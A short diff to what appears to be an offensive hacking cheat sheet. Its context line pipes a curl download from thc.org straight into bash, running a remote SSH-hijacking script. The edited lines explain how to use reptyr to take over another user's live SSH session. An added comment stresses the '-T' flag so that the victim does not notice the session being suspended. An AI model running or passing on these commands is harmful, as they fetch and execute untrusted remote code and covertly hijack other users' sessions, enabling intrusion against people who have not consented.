@@ -1646,9 +1646,10 @@ bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
 
 Use [https://github.com/nelhage/reptyr](https://github.com/nelhage/reptyr) to take over an existing SSH session:
 ```sh
-ps alxww | grep ssh
-./reptyr <SSH PID>
-### or: ./reptyr $(pidof -s ssh)
+ps ax -o pid,ppid,cmd | grep 'ssh '
+./reptyr -T <SSH PID>
+### or: ./reptyr -T $(pidof -s ssh)
+### Must use '-T' or otherwise the original user will see that his SSH process gets suspended.
 ```
 
 ---
